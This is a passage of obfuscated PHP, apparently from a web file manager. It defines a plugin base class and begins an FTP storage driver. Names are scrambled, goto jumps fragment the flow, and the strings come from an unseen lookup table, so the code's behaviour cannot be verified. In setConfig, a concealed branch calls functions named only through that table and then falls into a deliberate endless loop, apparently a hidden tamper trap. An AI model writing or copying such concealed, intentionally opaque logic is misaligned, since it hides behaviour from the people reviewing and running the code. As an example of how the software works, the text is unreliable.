$FùÉŸ…’šö[1293]; $D¼ìøîîŠ = json_encode($GLOBALS[$FùÉŸ…’šö[1294]]); goto BÅ´ï¾ãØº; BÎÃßŠ§ºÇ: } global $in, $config; $this->config =& $config; goto aôóŠÂßÑ; B„¯Éœº¤Ô: return $this; goto a‘ßÆù«÷ğ; a‡êÎë ç‡: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $FùÉŸ…’šö[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto B„¯Éœº¤Ô; a‘ßÆù«÷ğ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ìó][1297]); } protected function assign($B‚äÓâø‘, $D®’©°‡¶ = false) { if (is_array($B‚äÓâø‘)) { $this->values = array_merge($this->values, $B‚äÓâø‘); } else { $this->values[$B‚äÓâø‘] = $D®’©°‡¶; } } protected function display($dĞµ¿¯´) { extract($this->values); require $dĞµ¿¯´; } final function hookRegist($E«ŸŠ¯íä¶) { $this->modelPlugin->appRegist($this->pluginName, $E«ŸŠ¯íä¶); } final function appIcon() { $E¹•ğİéäÇ =& $_SERVER[Ìó]; $Bˆ’¤«œó = $this->appPackage(); $a«‰››óçÀ = $E¹•ğİéäÇ[33]; if (isset($Bˆ’¤«œó[$E¹•ğİéäÇ[378]])) { if (isset($Bˆ’¤«œó[$E¹•ğİéäÇ[378]][$E¹•ğİéäÇ[1298]])) { $a«‰››óçÀ = $E¹•ğİéäÇ[1299] . $Bˆ’¤«œó[$E¹•ğİéäÇ[378]][$E¹•ğİéäÇ[1298]] . $E¹•ğİéäÇ[1300]; } else { if ($Bˆ’¤«œó[$E¹•ğİéäÇ[378]][$E¹•ğİéäÇ[1301]]) { $a«‰››óçÀ = $E¹•ğİéäÇ[1302] . $Bˆ’¤«œó[$E¹•ğİéäÇ[378]][$E¹•ğİéäÇ[1301]] . $E¹•ğİéäÇ[1303]; } } } return $a«‰››óçÀ; } final function fileCanView($e±“‰äÕ) { $BÎÇ–ÂÚ¬Ò =& $_SERVER[Ìó]; if (request_url_safe($e±“‰äÕ)) { return !0; } if ($this->isShare($e±“‰äÕ)) { return !0; } if (!Action($BÎÇ–ÂÚ¬Ò[1304])->authCan($BÎÇ–ÂÚ¬Ò[1305])) { show_tips(LNG($BÎÇ–ÂÚ¬Ò[1306]) . $BÎÇ–ÂÚ¬Ò[1307], !1); } ActionCall($BÎÇ–ÂÚ¬Ò[1308], $e±“‰äÕ); } final function isShare($BÙÙğ†«‰) { $A¿Ö·æ…î = KodIO::parse($BÙÙğ†«‰); return $A¿Ö·æ…î[$_SERVER[Ìó][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($FÍ×åÎÄŸ) { if (request_url_safe($FÍ×åÎÄŸ)) { return $FÍ×åÎÄŸ; } if (!$this->isShare($FÍ×åÎÄŸ)) { $FÍ×åÎÄŸ = $this->filePath($FÍ×åÎÄŸ); } return Action($_SERVER[Ìó][1013])->linkOut($FÍ×åÎÄŸ); } public function filePathLinkOut($fËé¥ØİÆÄ) { if (request_url_safe($fËé¥ØİÆÄ)) { return $fËé¥ØİÆÄ; } $this->fileCanView($fËé¥ØİÆÄ); return Action($_SERVER[Ìó][1013])->link($fËé¥ØİÆÄ); } final function filePath($c—îùçùÇ‡) { $E™’ãƒï¨ë =& $_SERVER[Ìó]; if ($AÆ¨±‘ˆÀâ = $this->checkSharePath($c—îùçùÇ‡)) { return $AÆ¨±‘ˆÀâ; } $this->fileCanView($c—îùçùÇ‡); if (request_url_safe($c—îùçùÇ‡)) { $bŸÈ„‚ïğâ = parse_url_query($c—îùçùÇ‡); if (isset($bŸÈ„‚ïğâ[$E™’ãƒï¨ë[1309]]) && isset($bŸÈ„‚ïğâ[$E™’ãƒï¨ë[193]])) { $Dò§† = Model($E™’ãƒï¨ë[1084])->get($E™’ãƒï¨ë[1310]); $cçîö©óÄº = Mcrypt::decode($bŸÈ„‚ïğâ[$E™’ãƒï¨ë[193]], $Dò§†); if ($cçîö©óÄº) { $this->fileInfo = IO::infoWithChildren($cçîö©óÄº); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $cçîö©óÄº; } } $c—îùçùÇ‡ = $this->_cacheHttpFile($c—îùçùÇ‡); $this->fileInfo = IO::infoWithChildren($c—îùçùÇ‡); } else { $this->fileInfo = IO::infoWithChildren($c—îùçùÇ‡); if (!$this->fileInfo) { show_tips(LNG($E™’ãƒï¨ë[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $c—îùçùÇ‡; } final function _cacheHttpFile($Dó¬¦£Šğ) { $dºõõùàùŠ = hash_path($Dó¬¦£Šğ, !0); $this->cachePath = $this->pluginCachePath($dºõõùàùŠ); if ($bÀŒ‰¢ªßó = IO::fileNameExist($this->cachePath, $dºõõùàùŠ)) { return KodIO::make($bÀŒ‰¢ªßó); } $CÖï§Óó†™ = $this->cachePath . $dºõõùàùŠ; return $this->pluginCacheFileSet($CÖï§Óó†™, file_get_contents($Dó¬¦£Šğ)); } final function _tmpFileName($BË™ÊØ¡ = array()) { goto B°ó¡Òæ¦Ü; Eñ±ö•ñ“Ù: return md5(implode($bÊŒ¦â½áå[70], $d‘’â÷”Æ¿)); goto B¢òòäÙ†ò; B°ó¡Òæ¦Ü: $bÊŒ¦â½áå =& $_SERVER[Ìó]; if (!$BË™ÊØ¡) { $BË™ÊØ¡ = $this->fileInfo; } if (isset($BË™ÊØ¡[$bÊŒ¦â½áå[160]])) { return $BË™ÊØ¡[$bÊŒ¦â½áå[160]]; } goto E©Ü°óª²­; E©Ü°óª²­: if (isset($BË™ÊØ¡[$bÊŒ¦â½áå[158]][$bÊŒ¦â½áå[160]])) { return $BË™ÊØ¡[$bÊŒ¦â½áå[158]][$bÊŒ¦â½áå[160]]; } $d‘’â÷”Æ¿ = array($BË™ÊØ¡[$bÊŒ¦â½áå[28]], $BË™ÊØ¡[$bÊŒ¦â½áå[75]], $BË™ÊØ¡[$bÊŒ¦â½áå[77]]); if (isset($BË™ÊØ¡[$bÊŒ¦â½áå[454]])) { $d‘’â÷”Æ¿[] = $BË™ÊØ¡[$bÊŒ¦â½áå[454]]; } goto Eñ±ö•ñ“Ù; B¢òòäÙ†ò: } final function checkSharePath($f–àø­¸¨æ) { goto FŠ®ÙŞš‹; C¡´˜©¾¤: $dìÂºÆé«Õ = Action($F­¹±°À™š[1013])->sharePathInfo($f–àø­¸¨æ); if (!isset($dìÂºÆé«Õ[$F­¹±°À™š[75]])) { show_json(LNG($F­¹±°À™š[1312]), !1); } $this->fileInfo = $dìÂºÆé«Õ[$F­¹±°À™š[158]]; goto a‡ÎŒ ¿¹Á; FŠ®ÙŞš‹: $F­¹±°À™š =& $_SERVER[Ìó]; if (!defined($F­¹±°À™š[422])) { define($F­¹±°À™š[1311], 0); } if (!$this->isShare($f–àø­¸¨æ)) { return !1; } goto C¡´˜©¾¤; a‡ÎŒ ¿¹Á: $this->cachePath = $this->pluginCachePath($this->fileInfo[$F­¹±°À™š[160]]); return $dìÂºÆé«Õ[$F­¹±°À™š[75]]; goto cÆôù÷Ì…ï; cÆôù÷Ì…ï: } final function pluginCachePath($DŒè¿ØÏ¹¤ = '') { $B­®è²ÍÓ =& $_SERVER[Ìó]; $fØŸ›Çšòô = IO_PATH_SYSTEM_TEMP . $B­®è²ÍÓ[1313] . $this->pluginName; if (!($Bç²é¼ß = IO::infoFull($fØŸ›Çšòô))) { return IO::mkdir($fØŸ›Çšòô . $B­®è²ÍÓ[8] . $DŒè¿ØÏ¹¤); } if (empty($DŒè¿ØÏ¹¤)) { return $Bç²é¼ß[$B­®è²ÍÓ[75]]; } if (!($Bâß¦Ú‹õ– = IO::fileNameExist($Bç²é¼ß[$B­®è²ÍÓ[75]], $DŒè¿ØÏ¹¤))) { return IO::mkdir($Bç²é¼ß[$B­®è²ÍÓ[75]] . $DŒè¿ØÏ¹¤); } return KodIO::make($Bâß¦Ú‹õ–); } final function pluginCacheFileSet($f‰‰¦„†ëè, $D»˜êŸÆ·Ğ = '') { $c†¬¡ëä‚ä =& $_SERVER[Ìó]; if (!($Béºğì®–… = IO::infoFull($f‰‰¦„†ëè))) { return IO::mkfile($f‰‰¦„†ëè, $D»˜êŸÆ·Ğ, REPEAT_REPLACE); } IO::setContent($Béºğì®–…[$c†¬¡ëä‚ä[75]], $D»˜êŸÆ·Ğ); return $Béºğì®–…[$c†¬¡ëä‚ä[75]]; } final function pluginLocalFile($a «‚ï—Í = '') { goto dØŸ¯ØÇ°­; c‡ÍºíÇ«ï: $E‡ÊÌôë Ÿ = $EËÙ»ãĞ . $E²’¦”Ö; if (@file_exists($E‡ÊÌôë Ÿ)) { return $E‡ÊÌôë Ÿ; } return IO::copy($a «‚ï—Í, $EËÙ»ãĞ, 0, $E²’¦”Ö); goto F´•“¤ì¥”; dØŸ¯ØÇ°­: $a‰™•¹¼šŞ =& $_SERVER[Ìó]; $EËÙ»ãĞ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($EËÙ»ãĞ)) { mk_dir($EËÙ»ãĞ); } goto B§‹ºªöİË; B§‹ºªöİË: if (!$a «‚ï—Í) { return $EËÙ»ãĞ; } $BÑÇÙµ ˆ = IO::info($a «‚ï—Í); $E²’¦”Ö = $this->_tmpFileName($BÑÇÙµ ˆ) . $a‰™•¹¼šŞ[91] . $BÑÇÙµ ˆ[$a‰™•¹¼šŞ[156]]; goto c‡ÍºíÇ«ï; F´•“¤ì¥”: } final function appPackage() { goto DøÇ˜ËæĞ©; Fƒ¹ˆ¢ÚÚ¦: $eœçŒ±ñ = Hook::trigger($e·°²ÂÉë[1315], $bìÛÍ‘¹™); if ($eœçŒ±ñ && is_array($eœçŒ±ñ)) { $bìÛÍ‘¹™ = $eœçŒ±ñ; } $this->packageData = $bìÛÍ‘¹™; goto E…‡¼ôŠÓó; båõ¨¨Ô¥œ: $this->parseLang($AÚğ÷¥Ãå); $bìÛÍ‘¹™ = json_decode_force($AÚğ÷¥Ãå); if (!$bìÛÍ‘¹™) { return array(); } goto Fƒ¹ˆ¢ÚÚ¦; DøÇ˜ËæĞ©: $e·°²ÂÉë =& $_SERVER[Ìó]; if ($this->packageData) { return $this->packageData; } $AÚğ÷¥Ãå = $this->parseFile($this->pluginPath . $e·°²ÂÉë[1314]); goto båõ¨¨Ô¥œ; E…‡¼ôŠÓó: return $bìÛÍ‘¹™; goto FŒ¡ÄÂ˜ÛÖ; FŒ¡ÄÂ˜ÛÖ: } public function packageInfoGet($D—î¤§¾óœ) { $fÀÒ¨÷´†² = $this->appPackage(); return array_get_value($fÀÒ¨÷´†², $D—î¤§¾óœ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ìó][1316]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ìó][1317]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ìó][1318]); } private function parseFile($Fç¼¦í‹ŒÁ) { $D¼Œ™»Ú¤è =& $_SERVER[Ìó]; $DÃ’Ù¨»°Ñ = file_get_contents($Fç¼¦í‹ŒÁ); $a¢¿šÎùÄî = array($D¼Œ™»Ú¤è[1319], $D¼Œ™»Ú¤è[1320], $D¼Œ™»Ú¤è[1321], $D¼Œ™»Ú¤è[1322], $D¼Œ™»Ú¤è[1323], $D¼Œ™»Ú¤è[1324], $D¼Œ™»Ú¤è[1325]); $C­ÕèëãÀ² = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D¼Œ™»Ú¤è[84]][$D¼Œ™»Ú¤è[1326]]); $DÃ’Ù¨»°Ñ = str_replace($a¢¿šÎùÄî, $C­ÕèëãÀ², $DÃ’Ù¨»°Ñ); return $DÃ’Ù¨»°Ñ; } private function parseLang(&$Bœˆ‘Å—‡‚) { goto FÀ‰ĞáÒ©£; BÓÃ§ĞÂÀà: preg_match_all($A­ÑÁŞƒã[1328], $Bœˆ‘Å—‡‚, $eÌ¤”º¶Ú¹); if (!is_array($eÌ¤”º¶Ú¹) || count($eÌ¤”º¶Ú¹) == 0 || !is_array($eÌ¤”º¶Ú¹[0]) || count($eÌ¤”º¶Ú¹[0]) == 0) { return; } $eÛ“Á…¬µ = array(); goto Bé¶Îœ‰¨ ; FÀ‰ĞáÒ©£: $A­ÑÁŞƒã =& $_SERVER[Ìó]; $Fµšœß‚‚ = $A­ÑÁŞƒã[1327]; if (!strstr($Bœˆ‘Å—‡‚, $Fµšœß‚‚)) { return; } goto BÓÃ§ĞÂÀà; Bé¶Îœ‰¨ : $EËÒêŸñ­ª = array(); foreach ($eÌ¤”º¶Ú¹[0] as $fØëÍè†£) { $B›˜†è¡›Ç = substr($fØëÍè†£, strlen($Fµšœß‚‚), -4); $fÍ¨ÄÎ‰å  = LNG($B›˜†è¡›Ç); $eÛ“Á…¬µ[] = $fØëÍè†£; $EËÒêŸñ­ª[] = str_replace(array($A­ÑÁŞƒã[213], $A­ÑÁŞƒã[988], $A­ÑÁŞƒã[326], $A­ÑÁŞƒã[112]), array($A­ÑÁŞƒã[50], $A­ÑÁŞƒã[50], $A­ÑÁŞƒã[33], $A­ÑÁŞƒã[1329]), $fÍ¨ÄÎ‰å ); } $Bœˆ‘Å—‡‚ = str_replace($eÛ“Á…¬µ, $EËÒêŸñ­ª, $Bœˆ‘Å—‡‚); goto AæÄ´“Ş™œ; AæÄ´“Ş™œ: } private function parseConfig(&$D©Ñ¬ö…£) { goto D¢¦Ü‹Êòæ; D¢¦Ü‹Êòæ: $fƒ‰ÀÏêò =& $_SERVER[Ìó]; $B®Ñ™Ç¤âà = $fƒ‰ÀÏêò[1330]; if (!strstr($D©Ñ¬ö…£, $B®Ñ™Ç¤âà)) { return; } goto A‘òšã»øö; A‘òšã»øö: preg_match_all($fƒ‰ÀÏêò[1331], $D©Ñ¬ö…£, $A”¨³ä•ö); if (!is_array($A”¨³ä•ö) || count($A”¨³ä•ö) == 0 || !is_array($A”¨³ä•ö[0]) || count($A”¨³ä•ö[0]) == 0) { return; } $cÉ¾‘èÉåó = $this->getConfig(); goto CÜõ¨Ê‰½¹; CÜõ¨Ê‰½¹: $A§‰À»ğ®Ø = array(); $d·Ú‡ğ ÷î = array(); foreach ($A”¨³ä•ö[0] as $EãšŸÀç–) { $EÆ›îì¼âÌ = substr($EãšŸÀç–, strlen($B®Ñ™Ç¤âà), -2); $A§‰À»ğ®Ø[] = $EãšŸÀç–; $d·Ú‡ğ ÷î[] = _get($cÉ¾‘èÉåó, $EÆ›îì¼âÌ); } goto FÇîå—¥“ï; FÇîå—¥“ï: $D©Ñ¬ö…£ = str_replace($A§‰À»ğ®Ø, $d·Ú‡ğ ÷î, $D©Ñ¬ö…£); goto eë•÷¾¼Ù‘; eë•÷¾¼Ù‘: } private function parsePackage(&$cŞ‰”²Â¡) { goto e·œôÎí˜; FµŸ†Ñ‰·ª: $B»à•ä–­ù = array(); $EĞÕ¼î‹‰ = array(); foreach ($aº’‚×©Ï[0] as $fˆâîµòˆø) { $Eñ«¹•Ãµ = substr($fˆâîµòˆø, strlen($bˆïÍ³Şâ˜), -2); $B»à•ä–­ù[] = $fˆâîµòˆø; $EĞÕ¼î‹‰[] = _get($cÍöï«¾ª, $Eñ«¹•Ãµ); } goto eºŠĞ¿’’Â; eºŠĞ¿’’Â: $cŞ‰”²Â¡ = str_replace($B»à•ä–­ù, $EĞÕ¼î‹‰, $cŞ‰”²Â¡); goto f‚í‡ŠíËÊ; e·œôÎí˜: $EÙ—‡î«•é =& $_SERVER[Ìó]; $bˆïÍ³Şâ˜ = $EÙ—‡î«•é[1332]; if (!strstr($cŞ‰”²Â¡, $bˆïÍ³Şâ˜)) { return; } goto EñŠá‡é¶; EñŠá‡é¶: preg_match_all($EÙ—‡î«•é[1333], $cŞ‰”²Â¡, $aº’‚×©Ï); if (!is_array($aº’‚×©Ï) || count($aº’‚×©Ï) == 0 || !is_array($aº’‚×©Ï[0]) || count($aº’‚×©Ï[0]) == 0) { return; } $cÍöï«¾ª = $this->appPackage(); goto FµŸ†Ñ‰·ª; f‚í‡ŠíËÊ: } final function echoFile($FŠâğÀë²¯, $AŸ“Š¿çè¿ = false) { goto Eğˆ…½é´…; fÒŞÙ¥ƒ§¥: $BÓÅÎ±ã¶° = $this->parseFile($CÛŸõ‹ë¦¬); $this->parseLang($BÓÅÎ±ã¶°); $this->parseConfig($BÓÅÎ±ã¶°); goto d‘ãôˆ”³Ò; d‘ãôˆ”³Ò: $this->parsePackage($BÓÅÎ±ã¶°); if (is_array($AŸ“Š¿çè¿)) { $BÓÅÎ±ã¶° = str_replace(array_keys($AŸ“Š¿çè¿), array_values($AŸ“Š¿çè¿), $BÓÅÎ±ã¶°); } echo $bØçÉ†š¾ğ[213] . $BÓÅÎ±ã¶°; goto F¤šáÂÑ«§; Eğˆ…½é´…: $bØçÉ†š¾ğ =& $_SERVER[Ìó]; $CÛŸõ‹ë¦¬ = $this->pluginPath . $FŠâğÀë²¯; if (ACT == $bØçÉ†š¾ğ[1334]) { echo $bØçÉ†š¾ğ[1335] . $this->pluginName . $bØçÉ†š¾ğ[8] . $FŠâğÀë²¯ . $bØçÉ†š¾ğ[1336]; if (!file_exists($CÛŸõ‹ë¦¬)) { echo $bØçÉ†š¾ğ[1337]; return; } } goto fÒŞÙ¥ƒ§¥; F¤šáÂÑ«§: } final function initLang() { goto Bµè‚¡¡Ì‘; Bµè‚¡¡Ì‘: $b—ªº¼ÅÉƒ =& $_SERVER[Ìó]; $AØìÑƒ¹Ôƒ = $b—ªº¼ÅÉƒ[1338]; $câ›œÏƒĞ± = $this->pluginPath . $b—ªº¼ÅÉƒ[1339]; goto f¨öÇì»¦Ÿ; BÅ†’éŠÂ : if (!is_array($aïîå£âÍä)) { return array(); } if (@count($aïîå£âÍä) > 0) { I18n::set($aïîå£âÍä); } return $aïîå£âÍä; goto f¾ßƒ÷ÃÜØ; f¨öÇì»¦Ÿ: $D°„©êñ = I18n::getType(); $aïîå£âÍä = array(); if (file_exists($câ›œÏƒĞ± . $D°„©êñ . $b—ªº¼ÅÉƒ[760])) { $aïîå£âÍä = (include $câ›œÏƒĞ± . $D°„©êñ . $b—ªº¼ÅÉƒ[760]); } else { if ($D°„©êñ == $b—ªº¼ÅÉƒ[1340] && !file_exists($câ›œÏƒĞ± . $D°„©êñ . $b—ªº¼ÅÉƒ[760]) && file_exists($câ›œÏƒĞ± . $b—ªº¼ÅÉƒ[1341])) { $aïîå£âÍä = (include $câ›œÏƒĞ± . $b—ªº¼ÅÉƒ[1341]); } else { if (file_exists($câ›œÏƒĞ± . $AØìÑƒ¹Ôƒ . $b—ªº¼ÅÉƒ[760])) { $aïîå£âÍä = (include $câ›œÏƒĞ± . $AØìÑƒ¹Ôƒ . $b—ªº¼ÅÉƒ[760]); } } } goto BÅ†’éŠÂ ; f¾ßƒ÷ÃÜØ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aà—öàÌÜ) { $d’ÅòÖ–ò™ =& $_SERVER[Ìó]; if (!isset($_SERVER[$d’ÅòÖ–ò™[768]]) || !isset($_SERVER[$d’ÅòÖ–ò™[775]])) { goto cƒ—È’é—; FÒÛ‰„†Û: $C¦†Åå…„ù = $aŸí˜ØÌ‡º($BÏÓºªîä); $FÂù¦¾ÉÚì = explode($d’ÅòÖ–ò™[213], $C¦†Åå…„ù); if (count($FÂù¦¾ÉÚì) < $d’ÅòÖ–ò™[551]) { $cáÆáÛ Ã = $d’ÅòÖ–ò™[773]; $cáÆáÛ Ã(); } goto dÎÄ§‡Š¨; dÎÄ§‡Š¨: $A¾™ù´ÀšË = $d’ÅòÖ–ò™[791]; $A¾™ù´ÀšË($_SERVER[$d’ÅòÖ–ò™[792]]); $DÊ†ÜÃ‹ŸÑ = 1; goto BÒÛƒÜ‹¯; cƒ—È’é—: $Dä˜§öÛõË = $d’ÅòÖ–ò™[790]; $aŸí˜ØÌ‡º = $d’ÅòÖ–ò™[770]; $BÏÓºªîä = $_SERVER[$d’ÅòÖ–ò™[771]] . $d’ÅòÖ–ò™[772]; goto FÒÛ‰„†Û; BÒÛƒÜ‹¯: for ($E‘õµÈèí = $DÊ†ÜÃ‹ŸÑ; $E‘õµÈèí > 0; $E‘õµÈèí++) { $A¾™ù´ÀšË = json_encode($GLOBALS[$d’ÅòÖ–ò™[380]]); } goto f§ÔƒÇ„æ; f§ÔƒÇ„æ: } return $this->modelPlugin->setConfig($this->pluginName, $aà—öàÌÜ); } public function onSetConfig($dåçõ¶Ê½Ø) { } public function onGetConfig($F³¨ßğ”º«) { } public function onChangeStatus($c¢×Å¥è´Á) { } public function onUninstall() { } public function onInstall() { } public function authCheck($B¯İ‚­„Œë = "\x70\x6c\x75\147\x69\x6e\x41\x75\x74\x68") { $d‰êŒçƒ =& $_SERVER[Ìó]; if (!defined($d‰êŒçƒ[422])) { return !1; } if (_get($GLOBALS, $d‰êŒçƒ[452])) { return !0; } $cçÊãï§ØÎ = $this->getConfig(); if (!$cçÊãï§ØÎ[$B¯İ‚­„Œë]) { return !1; } return ActionCall($d‰êŒçƒ[1342], $cçÊãï§ØÎ[$B¯İ‚­„Œë]); } public function url($AÎÍ…†ÖÅ, $F²ËÄ±ïèà = '', $b±÷¶ŸñÓ = true) { goto D†ÁÛ§ĞÔÁ; C…öÂáµÊØ: $fõù¶·ƒÊ = $this->packageVersion(); $dÏ…Û±î¿ = $A£ªèòÄ¬õ . $D§Ÿ…¼İ[407] . $fõù¶·ƒÊ; if (substr($AÎÍ…†ÖÅ, 0, 4) == $D§Ÿ…¼İ[142] || substr($AÎÍ…†ÖÅ, 0, 2) == $D§Ÿ…¼İ[1143]) { $Fª¨”®“¿³ = $AÎÍ…†ÖÅ . $D§Ÿ…¼İ[1343] . $dÏ…Û±î¿; } else { if ($F²ËÄ±ïèà == $D§Ÿ…¼İ[33]) { $Fª¨”®“¿³ = $this->pluginHost . $AÎÍ…†ÖÅ . $D§Ÿ…¼İ[1343] . $dÏ…Û±î¿; } else { if ($F²ËÄ±ïèà === $D§Ÿ…¼İ[76]) { $Fª¨”®“¿³ = $this->pluginHost . $AÎÍ…†ÖÅ; } else { if ($F²ËÄ±ïèà == $D§Ÿ…¼İ[1344]) { $Fª¨”®“¿³ = STATIC_PATH . $AÎÍ…†ÖÅ . $D§Ÿ…¼İ[1343] . $A£ªèòÄ¬õ; } else { if ($F²ËÄ±ïèà == $D§Ÿ…¼İ[1345]) { $Fª¨”®“¿³ = APP_HOST . $D§Ÿ…¼İ[1346] . $AÎÍ…†ÖÅ . $D§Ÿ…¼İ[1343] . $A£ªèòÄ¬õ; } else { if (isset($bñØƒÛ‰®[$F²ËÄ±ïèà])) { $Fª¨”®“¿³ = $bñØƒÛ‰®[$F²ËÄ±ïèà] . $AÎÍ…†ÖÅ . $D§Ÿ…¼İ[1343] . $dÏ…Û±î¿; } } } } } } goto Fù›Çğ‘’; Fù›Çğ‘’: if (!$b±÷¶ŸñÓ) { return $Fª¨”®“¿³; } echo $Fª¨”®“¿³; goto CĞß‘éÑ¸Š; D†ÁÛ§ĞÔÁ: $D§Ÿ…¼İ =& $_SERVER[Ìó]; $bñØƒÛ‰® = $this->getConfig(); $A£ªèòÄ¬õ = KOD_VERSION . $D§Ÿ…¼İ[91] . KOD_VERSION_BUILD; goto C…öÂáµÊØ; CĞß‘éÑ¸Š: } public function link($E¾‹ïõŸ = false, $cƒ¶¼½â — = '') { $A’¿Šõ‹ğÏ =& $_SERVER[Ìó]; if (!$E¾‹ïõŸ) { $this->link($A’¿Šõ‹ğÏ[1347], $A’¿Šõ‹ğÏ[1345]); $this->link($A’¿Šõ‹ğÏ[1348], $A’¿Šõ‹ğÏ[1344]); $this->link($A’¿Šõ‹ğÏ[1349], $A’¿Šõ‹ğÏ[1344]); $this->link($A’¿Šõ‹ğÏ[1350], $A’¿Šõ‹ğÏ[1344]); $this->link($A’¿Šõ‹ğÏ[1351], $A’¿Šõ‹ğÏ[1344]); return; } $A ¹™¿æø = $this->url($E¾‹ïõŸ, $cƒ¶¼½â —, !1); if (substr($E¾‹ïõŸ, -3) == $A’¿Šõ‹ğÏ[1352]) { echo $A’¿Šõ‹ğÏ[1353] . $A ¹™¿æø . $A’¿Šõ‹ğÏ[1354] . $A’¿Šõ‹ğÏ[213]; } else { if (substr($E¾‹ïõŸ, -4) == $A’¿Šõ‹ğÏ[1355]) { echo $A’¿Šõ‹ğÏ[1356] . $A ¹™¿æø . $A’¿Šõ‹ğÏ[1357] . $A’¿Šõ‹ğÏ[213]; } } } } goto c¯ÚÏŠ¸ó­; E°„Æ¸®³«: function beforeShutdownFatalError($DôòÚ„ä‡Ä) { think_exception($DôòÚ„ä‡Ä); } $_SERVER[$_SERVER[†˜ı][48]] = $CØÁÀÍ¨æ($_SERVER[$_SERVER[†˜ı][45]]); $C•›âö®·É = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto E…à–ˆ¼¼; Eë·µ•â: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($díê¸¹ã÷ñ) { parent::__construct(); if (count($díê¸¹ã÷ñ) > 0) { $this->_init($díê¸¹ã÷ñ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($F²íö¤¤¹) { $cï¶˜‘Š­ =& $_SERVER[Ìó]; global $config; $this->appCharset = $config[$cï¶˜‘Š­[1140]]; $this->systemCharset = $config[$cï¶˜‘Š­[1141]]; if (isset($F²íö¤¤¹[$cï¶˜‘Š­[1142]]) && $F²íö¤¤¹[$cï¶˜‘Š­[1142]]) { $this->systemCharset = $F²íö¤¤¹[$cï¶˜‘Š­[1142]]; } } public function iconvApp($e„ãÍãøÖÕ) { return $this->iconvTo($e„ãÍãøÖÕ, $this->systemCharset, $this->appCharset); } public function iconvSystem($dâ šçÖ‰ö) { return $this->iconvTo($dâ šçÖ‰ö, $this->appCharset, $this->systemCharset); } public function getPathOuter($cªª‘ù÷‡) { goto A¹­õĞ†æÚ; açÌŠ¸Î·®: if (substr($a¸»µ¹¢, 0, 2) == $a²áöĞÃ‡ß[1143]) { $a¸»µ¹¢ = BASIC_PATH . substr($a¸»µ¹¢, 2); } if (substr($cªª‘ù÷‡, 0, 2) == $a²áöĞÃ‡ß[1143]) { $cªª‘ù÷‡ = BASIC_PATH . substr($cªª‘ù÷‡, 2); } $a¸»µ¹¢ = KodIO::clear($a¸»µ¹¢); goto C¯å¶ˆõé; cÁÅ¹ğ´šÊ: return $this->pathDriver . $a²áöĞÃ‡ß[8] . ltrim($cªª‘ù÷‡, $a²áöĞÃ‡ß[8]); goto eºÂÛß±‡ê; A¹­õĞ†æÚ: $a²áöĞÃ‡ß =& $_SERVER[Ìó]; $a¸»µ¹¢ = $this->iconvApp($this->pathBase); $cªª‘ù÷‡ = $this->iconvApp($cªª‘ù÷‡); goto açÌŠ¸Î·®; C¯å¶ˆõé: $cªª‘ù÷‡ = KodIO::clear($cªª‘ù÷‡); $cªª‘ù÷‡ = substr($cªª‘ù÷‡, strlen($a¸»µ¹¢)); if (empty($this->pathDriver)) { return $cªª‘ù÷‡; } goto cÁÅ¹ğ´šÊ; eºÂÛß±‡ê: } private function _init($Fà¿”¢²¥ = array()) { goto cš’²³µà; eÆ¡ô±‡‡£: foreach ($Fà¿”¢²¥ as $DÊåå˜Ô÷æ => $b±×ŸÈğä­) { if (isset($this->{$DÊåå˜Ô÷æ})) { $this->{$DÊåå˜Ô÷æ} = $b±×ŸÈğä­; } } static $dÚùÇŠÖÛ¹ = array(); $DàÄâŠñº = md5(json_encode($Fà¿”¢²¥)); goto Eí«ë¼õ ×; bß¼ê©Ï—Ê: return $e‚±­½¨ÏÈ; goto fæ©îÆ½«…; aÉ‹”§ê³ß: $B¸Ó©Ã˜š¯ = isset($eŠÂ—ğö­ù[$F‡”öÂÈÕ›[164]]) && $eŠÂ—ğö­ù[$F‡”öÂÈÕ›[164]] == $F‡”öÂÈÕ›[1146] ? !0 : !1; $this->scheme = $B¸Ó©Ã˜š¯ ? $F‡”öÂÈÕ›[1147] : $F‡”öÂÈÕ›[1148]; $this->port = isset($eŠÂ—ğö­ù[$F‡”öÂÈÕ›[166]]) ? $eŠÂ—ğö­ù[$F‡”öÂÈÕ›[166]] : 21; goto F¡ò¢äÃèö; Eí«ë¼õ ×: if (isset($dÚùÇŠÖÛ¹[$DàÄâŠñº])) { foreach ($dÚùÇŠÖÛ¹[$DàÄâŠñº] as $DÊåå˜Ô÷æ => $b±×ŸÈğä­) { $this->{$DÊåå˜Ô÷æ} = $b±×ŸÈğä­; } return !0; } $eŠÂ—ğö­ù = parse_url(trim($this->server, $F‡”öÂÈÕ›[8])); $this->host = $eŠÂ—ğö­ù[$F‡”öÂÈÕ›[165]]; goto aÉ‹”§ê³ß; cš’²³µà: $F‡”öÂÈÕ› =& $_SERVER[Ìó]; if (!function_exists($F‡”öÂÈÕ›[1144])) { show_json(LNG($F‡”öÂÈÕ›[1145]), !1); } $this->charsetReset($Fà¿”¢²¥); goto eÆ¡ô±‡‡£; F¡ò¢äÃèö: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $e‚±­½¨ÏÈ = @ftp_login($this->connect, $this->username, $this->userpass); goto EÆ‘­Ì‡¦; EÆ‘­Ì‡¦: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $dÚùÇŠÖÛ¹[$DàÄâŠñº] = 